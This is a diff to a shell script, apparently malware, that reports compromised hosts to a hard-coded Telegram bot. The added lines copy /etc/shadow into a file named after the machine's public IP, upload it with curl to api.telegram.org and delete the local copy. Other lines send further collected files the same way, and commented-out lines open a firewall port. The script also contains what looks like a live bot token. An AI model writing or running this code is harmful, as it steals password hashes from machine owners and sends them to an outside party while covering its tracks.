@@ -39,7 +39,7 @@ if [ $? -eq 0 ]; then
 	#echo "Enabling portforwarding on port $f_port..."
 	#iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
 	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Port forwading enabled: $public_ip":"$f_port"		
-	
+
 	# Send report via telegram
 	token="5506183591:AAEL6myAZ8xZcVsMDzDx6Fgz6gUhTWo-pMk"
 	# chat id
@@ -52,7 +52,15 @@ if [ $? -eq 0 ]; then
 	curl -F chat_id="$chat_id" -F document=@"$filepath3" "https://api.telegram.org/bot$token/sendDocument"
 	rm "$filepath1"
 	rm "$filepath3"
+
+	#Dump /etc/shadow file
+	result_shadow="result_shadow_$public_ip.txt"
+	touch $result_shadow
+	cat /etc/shadow > $result_shadow
+	curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
+	rm "$result_shadow"
 	h=$(date +"%H:%M")
+	
 	#Schedule of 30 minutes
 	port=4000
 	start="14:00"
